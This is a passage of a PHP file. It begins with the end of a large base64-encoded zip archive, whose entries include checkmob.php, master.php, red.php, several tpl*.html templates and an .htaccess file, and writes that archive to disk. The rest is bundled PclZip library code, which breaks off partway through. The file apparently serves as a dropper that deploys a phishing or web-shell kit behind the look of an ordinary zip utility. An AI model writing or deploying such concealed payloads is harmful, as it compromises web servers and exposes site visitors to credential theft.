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"); 
file_put_contents($foldername."/".$myfilename.".zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_BY_NAME => 'optional',
                                                 PCLZIP_OPT_BY_EREG => 'optional',
                                                 PCLZIP_OPT_BY_PREG => 'optional',
                                                 PCLZIP_OPT_BY_INDEX => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											    ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
        if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
          $v_path .= '/';
        }
        $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
      }
    }

    else {

      $v_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_remove_path = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);


  $p_list = array();
  $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                     $v_remove_all_path, $v_options);
  if ($v_result < 1) {
    unset($p_list);
    return(0);
  }

  return $p_list;
}



function extractByIndex($p_index)
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
                                                 PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                 ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                 ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
											   ));
      if ($v_result != 1) {
        return 0;
      }

      if (isset($v_options[PCLZIP_OPT_PATH])) {
        $v_path = $v_options[PCLZIP_OPT_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
        $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
      }
      if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
        $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
      }
